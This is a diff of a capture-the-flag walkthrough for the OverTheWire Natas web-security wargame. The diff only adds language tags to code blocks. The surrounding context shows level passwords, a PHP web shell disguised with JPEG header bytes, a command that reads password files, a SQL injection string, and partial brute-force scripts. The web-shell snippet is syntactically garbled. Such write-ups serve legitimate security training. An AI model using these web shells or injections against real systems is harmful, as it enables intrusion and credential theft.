@@ -61,7 +61,7 @@ password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
 
 **[Natas06](http://natas6.natas.labs.overthewire.org)**  
 We have source code
-```
+```php
 <?
 include "includes/secret.inc";
 
@@ -75,7 +75,7 @@ if(array_key_exists("submit", $_POST)) {
 ?>
 ```
 Check http://natas6.natas.labs.overthewire.org/includes/secret.inc, we got
-```
+```php
 <?
 $secret = "FOEIUWGHFEEUHOFUOIU";
 ?>
@@ -100,7 +100,7 @@ password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 
 **[Natas08](http://natas8.natas.labs.overthewire.org)**  
 We have source code
-```
+```php
 <?
 
 $encodedSecret = "3d3d516343746d4d6d6c315669563362";
@@ -119,7 +119,7 @@ if(array_key_exists("submit", $_POST)) {
 ?>
 ```
 Try to decode the <i>encodeSecret</i>
-```
+```php
 <?php
 $encodedSecret = "3d3d516343746d4d6d6c315669563362";
 
@@ -139,7 +139,7 @@ password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 
 **[Natas09](http://natas9.natas.labs.overthewire.org)**  
 We have source code
-```
+```php
 <?
 $key = "";
 
@@ -165,7 +165,7 @@ password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
 
 **[Natas10](http://natas10.natas.labs.overthewire.org)**  
 We have source code
-```
+```php
 <?
 $key = "";
 
@@ -195,7 +195,7 @@ password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 
 **[Natas11](http://natas11.natas.labs.overthewire.org)**  
 We have source code
-```
+```php
 <?
 
 $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
@@ -248,7 +248,7 @@ Cookies are protected with XOR encryption, but let take a look, we can bypass fu
 message ^ key = encrypt_message
 message ^ encrypt_message = key
 ```
-```
+```php
 <?php
     $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
     $encodedSecret = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"; // Cookie
@@ -257,7 +257,7 @@ message ^ encrypt_message = key
 ?>
 ```
 We got the key <i>qw8J</i>
-```
+```php
 <?php
 function xor_encrypt($in) {
     $key = 'qw8J';
@@ -285,7 +285,7 @@ password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 
 **[Natas12](http://natas12.natas.labs.overthewire.org)**  
 We have source code
-```
+```php
 <? 
 
 function genRandomString() {
@@ -329,7 +329,7 @@ if(array_key_exists("filename", $_POST)) {
 ?>
 ```
 It doesn't check signature of file, so we try
-```
+```php
 <?php
     echo shell_exec('cat /etc/natas_webpass/natas13')
 ?>
@@ -343,8 +343,8 @@ password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
 **[Natas13](http://natas13.natas.labs.overthewire.org)**  
 We have source code, it's same Natas12 but it check signature of file, so we try
 http://natas13.natas.labs.overthewire.org/index.php?a=cat%20/etc/natas_webpass/natas14
-```
-shell=open('shell.php','wsshell.write('\xFF\xD8\xFF\xE0'<?php echo shell_exec($_GET["a"]); ?>')
+```php
+shell = open('shell.php','wsshell.write('\xFF\xD8\xFF\xE0'<?php echo shell_exec($_GET["a"]); ?>')
 shell.close()
 ```
 save natas13.php file, upload file and we got
@@ -355,7 +355,7 @@ password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 
 **[Natas14](http://natas14.natas.labs.overthewire.org)**  
 It's simple SQL Injection, input
-```
+```sql
 " or 1=1; #
 ```
 We got
@@ -366,13 +366,13 @@ password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 
 **[Natas15](http://natas15.natas.labs.overthewire.org)**  
 In source code, it return exists if execute query return number of rows > 0
-```
+```php
 if(mysql_num_rows($res) > 0) {
         echo "This user exists.<br>";
     }
 ```
 We can brute force password
-```
+```python
 import requests
 import string
 
@@ -403,13 +403,13 @@ password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 
 **[Natas17](http://natas17.natas.labs.overthewire.org)**  
 It's same Natas16 but have filter
-```
+```php
 if(preg_match('/[;|&`\'"]/',$key)) {
         print "Input contains an illegal character!";
     }
 ```
 We can brute force password by using $(command)
-```
+```python
 import requests
 import string
 
@@ -441,7 +441,7 @@ password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
 **[Natas18](http://natas18.natas.labs.overthewire.org)**  
 It's same Natas16 and Natas17 but nothing echo for us,
 We can brute force password by using Time-based attack
-```
+```python
 import requests
 import string
 
